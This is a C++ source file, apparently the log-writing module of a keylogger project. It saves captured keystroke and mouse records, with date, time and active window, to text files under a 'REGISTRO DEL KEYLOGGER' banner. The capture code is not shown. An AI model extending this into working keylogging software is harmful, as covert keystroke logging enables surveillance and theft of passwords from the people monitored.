#include "Filetxt.h"

Filetxt::Filetxt(std::string dirKey, std::string dirMouse) {
	dirPathKey = dirKey;
	dirPathMouse = dirMouse;
}

void Filetxt::saveFile(std::string type, std::string name, std::string date, std::string time, std::string window, std::string content) {
	std::string path;
	if (type.compare("key") != 0) {
		path = dirPathMouse + "\\" + name + ".txt";
	}
	else {
		path = dirPathKey + "\\" + name + ".txt";
	}
	std::ofstream file(path);
	std::string title = "REGISTRO DEL KEYLOGGER";
	int num = title.length() + 60;
	if (!file) {
		std::cout << "Error al crear el archivo: " + name << std::endl;
	}
	else {
		for (int i = 0; i <= (num); i++) {
			file << "*";
		}
		file << std::endl << std::endl;
		for (int i = 0; i <= (num); i++) {
			file << " ";
			if (i == 15) {
				file << title;
			}
			file << " ";
		}
		file << std::endl << std::endl;
		for (int i = 0; i <= (num); i++) {
			file << "*";
		}
		file << std::endl;
		for (int i = 0; i <= (num); i++) {
			file << "*";
		}
		file << std::endl << std::endl;
		file << " [+] Fecha = " << date << std::endl;
		file << " [+] Hora = " << time << std::endl;
		file << " [+] Aplicacion = " << window << std::endl << std::endl;
		for (int i = 0; i <= (num); i++) {
			file << "*";
		}
		file << std::endl;
		file << " [+] Contenido" << std::endl;
		file << content << std::endl << std::endl;
		for (int i = 0; i <= (num); i++) {
			file << "*";
		}
		file << std::endl;
		file << "FIN DEL REGISTRO" << std::endl;
		for (int i = 0; i <= (num); i++) {
			file << "*";
		}
		file.close();
	}
}